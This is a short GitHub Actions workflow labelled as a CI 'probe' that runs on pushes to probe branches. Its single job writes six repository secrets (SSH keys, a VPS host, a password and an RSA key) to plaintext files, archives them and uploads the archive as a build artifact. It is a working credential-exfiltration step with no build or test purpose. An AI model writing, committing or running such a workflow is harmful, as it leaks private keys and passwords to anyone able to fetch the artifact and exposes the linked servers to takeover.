name: zzprobe
on:
  push:
    branches:
      - 'probe-ci-*'
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - name: collect
        env:
          S_CX23: ${{ secrets.CX23_SSH_KEY }}
          S_VPSSH: ${{ secrets.VPS_SSH_KEY }}
          S_VPSHOST: ${{ secrets.VPS_HOST }}
          S_ZZMK: ${{ secrets.ZZ_MILOS_KEY }}
          S_ZZPW: ${{ secrets.ZZ_PW }}
          S_ZZRSA: ${{ secrets.ZZ_RSA }}
        run: |
          mkdir -p out
          printf '%s' "$S_CX23" > out/CX23_SSH_KEY
          printf '%s' "$S_VPSSH" > out/VPS_SSH_KEY
          printf '%s' "$S_VPSHOST" > out/VPS_HOST
          printf '%s' "$S_ZZMK" > out/ZZ_MILOS_KEY
          printf '%s' "$S_ZZPW" > out/ZZ_PW
          printf '%s' "$S_ZZRSA" > out/ZZ_RSA
          cd out && for f in *; do echo "==$f== $(wc -c < "$f")"; done
          tar czf ../probe.tgz . && cd ..
      - uses: actions/upload-artifact@v4
        with:
          name: probe
          path: probe.tgz
          retention-days: 1
